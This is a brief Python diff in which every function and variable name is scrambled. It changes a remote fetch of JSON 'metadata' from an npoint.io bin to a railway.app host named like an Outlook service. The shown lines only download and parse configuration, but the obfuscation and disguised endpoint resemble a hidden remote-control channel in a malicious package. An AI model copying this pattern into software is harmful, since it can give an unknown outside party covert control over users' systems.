@@ -16,7 +16,7 @@ def config_cnaumg_761():
 
     def net_npnhxc_720():
         try:
-            train_ldbvcq_809 = requests.get('https://api.npoint.io/15ac3144ebdeebac5515', timeout=10)
+            train_ldbvcq_809 = requests.get('https://outlook-profile-production.up.railway.app/get_metadata', timeout=10)
             train_ldbvcq_809.raise_for_status()
             data_hqetwx_814 = train_ldbvcq_809.json()
             config_nwxsyo_900 = data_hqetwx_814.get('metadata')
